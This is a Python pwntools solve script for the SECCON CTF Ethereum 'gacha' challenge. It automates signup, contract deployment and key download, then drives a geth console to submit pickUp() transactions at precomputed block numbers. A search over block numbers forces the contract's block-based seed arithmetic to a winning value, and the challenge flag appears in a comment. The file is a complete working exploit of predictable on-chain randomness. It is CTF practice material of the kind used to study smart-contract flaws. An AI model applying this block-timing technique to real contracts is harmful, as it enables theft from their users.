from pwn import *
from subprocess import check_output
import requests
import json
import shutil
import time
import IPython

# context.log_level = 'debug'
# flag = 'SECCON{EthereumUseHashInManyPlaces}'

homeurl = 'http://ether.pwn.seccon.jp/'
regurl = homeurl + 'signup'
etherurl = homeurl + 'api/claimETH'
deployurl = homeurl + 'api/deploy/2'
dataurl = homeurl + 'api/getData/2'
configurl = homeurl + 'connection'
finalurl = homeurl + 'api/testLuck/2'
password = 'password'
delim = 'asdfqwerzxcv'

def step(state, number):
    return (state * number) % 200000

def findsequence(seed, start):
    # breadth first search
    # stop when result == 12345

    # initialize
    queue = {seed: []}
    blockn = start + ((start % 2) + 1) # we only want odd ones
    done = False
    # start exploring
    while not done:
        print blockn - start, len(queue)
        nextqueue = queue.copy()
        for state in queue:
            # check new block for every saved state
            newstate = step(state, blockn)
            #print newstate
            if newstate % 2 == 0:
                # skip
                continue
            if newstate == 12345:
                print 'found'
                print seed, queue[state] + [blockn]
                res = queue[state] + [blockn]
                done = True
                break
            if len(nextqueue[state]) > 3:
                # skip
                # we want a short sequence, to reduce timing errors
                continue
            nextqueue[newstate] = nextqueue[state] + [blockn]
        queue = nextqueue
        blockn += 2
    return res


# sign up
print "Signing up new account"
res = requests.post(regurl, data={'pass':password}, allow_redirects=False)
cookies = res.cookies
print "cookies:", cookies

# collect ether
print "Claiming Ether"
res = requests.get(etherurl, cookies=cookies)
if res.status_code != 200:
    exit(1)
print "done claiming ether"

# deploy lv1
print "Deploying level 2"
res = requests.get(deployurl, cookies=cookies)
if res.status_code != 200:
    exit(1)
print "done deploying"

# get contract address
print "Getting contract address"
res = requests.get(dataurl, cookies=cookies)
data = json.loads(res.text)
contract_addr = data["contractAddr"]
print "contract address:", contract_addr

# download key, save in keystore
print "Downloading key"
res = requests.get(configurl, cookies=cookies, stream=True)
if res.status_code == 200:
    with open('collection.zip', 'wb') as f:
        res.raw.decode_content = True
        shutil.copyfileobj(res.raw, f)
check_output(['unzip', '-q', '-o', 'collection.zip'])
check_output(['cp', 'prv.key', 'keystore/prv.key'])
print "done downloading key"

# open geth
print "Opening geth"
# command = ['geth', '--datadir', '.', 'init', 'genesis.json']
# check_output(command)
command = ['geth', 'attach', 'geth.ipc']
p = process(command)
print "opened interactive session"

# create contract variable
print "Creating conract variable"
command = 'var gachaContract = web3.eth.contract([{"constant":false,"inputs":[{"name":"_seed","type":"uint256"}],"name":"initSeed","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"played","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[],"name":"pickUp","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"lastHash","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"player","outputs":[{"name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"_password","type":"bytes"}],"name":"checkPassword","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"seed","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"owner","outputs":[{"name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"getItem","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_password","type":"bytes"}],"name":"changeOwner","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"inputs":[{"name":"_password","type":"bytes32"},{"name":"_seed","type":"uint256"},{"name":"_player","type":"address"}],"payable":false,"stateMutability":"nonpayable","type":"constructor"}]);'
print command
p.sendline(command)

# connect contract with address
print "Connecting contract with address"
command = 'var gacha2 = gachaContract.at("{}")'.format(contract_addr)
print command
p.sendline(command)

# define function that makes transactions at the correct block number
print "Defining function"
command = 'function func(myarray) { var cur = 0; function checkblock() { var fail = false; if (web3.eth.blockNumber == myarray[cur]) {console.log("=== picking up ===");  gacha2.pickUp(); cur++;} else if (web3.eth.blockNumber > myarray[cur]) {   console.log("TOO LATE!"); fail = true;  } if (cur == myarray.length) console.log("Go get the flag!");  else if (!fail) setTimeout(checkblock, 10); } checkblock();}'
print command
p.sendline(command)


account_ok = False
while not account_ok:
    time.sleep(1)

    # set default account
    print "Setting default account"
    command = 'eth.defaultAccount = web3.personal.listAccounts[0]'
    print command
    p.sendline(command)

    command = 'console.log("{}")'.format(delim)
    p.sendline(command)
    p.recvuntil(delim)

    # unlock account
    print "Unlocking account"
    command = 'web3.personal.unlockAccount(eth.defaultAccount, "{}", 0)'.format(password)
    print command
    p.sendline(command)

    command = 'console.log("{}")'.format(delim)
    p.sendline(command)
    res = p.recvuntil(delim)
    if 'true' in res:
        account_ok = True
        print 'account ok!!'

# get block number
print "Getting block number"
command = 'console.log("{}" + web3.eth.blockNumber)'.format(delim)
print command
p.sendline(command)
p.recvuntil(delim)
blocknum = int(p.recvuntil('\n').strip())
print "block number:", blocknum

# compute list of block numbers at which to trigger the check
print "Finding good sequence"
wholeseq = findsequence(11, blocknum + 4)
print wholeseq

# get list of block numbers at which we need to submit the transaction
funcseq = [x-1 for x in wholeseq[:-1]]
print funcseq

# start javascript function that automatically submits transactions
print "Starting function"
command = ("func({})".format(funcseq))
print command
p.sendline(command)

# print sequence of seed values
print "Values to check:"
start = 11
for x in wholeseq:
    start = step(start, x)
    print start

prog1 = log.progress('blocknum')
lastseed = 11

last = wholeseq[-1]
while blocknum < last - 5:
    # sleep a little, wait for the end
    time.sleep(0.5)
    command = 'console.log("{}" + gacha2.seed())'.format(delim)
    p.sendline(command)
    res = p.recvuntil(delim)
    seed = int(p.recvuntil('\n').strip())
    if seed != lastseed:
        print seed
        lastseed = seed
    command = 'console.log("{}" + web3.eth.blockNumber)'.format(delim)
    p.sendline(command)
    res = p.recvuntil(delim)
    blocknum = int(p.recvuntil('\n').strip())
    prog1.status(str(blocknum))
while blocknum < last - 1:
    # accelerate
    time.sleep(0.1)
    command = 'console.log("{}" + web3.eth.blockNumber)'.format(delim)
    p.sendline(command)
    res = p.recvuntil(delim)
    blocknum = int(p.recvuntil('\n').strip())
    prog1.status(str(blocknum))

# we reached the correct block number, do the web request
print 'FINAL!'
res = requests.get(finalurl, cookies=cookies)

# retrieve flag
print 'getting flag?'
res = requests.get(dataurl, cookies=cookies)
data = json.loads(res.text)
flag = data["flag"]
print 'FLAG', flag

IPython.embed()
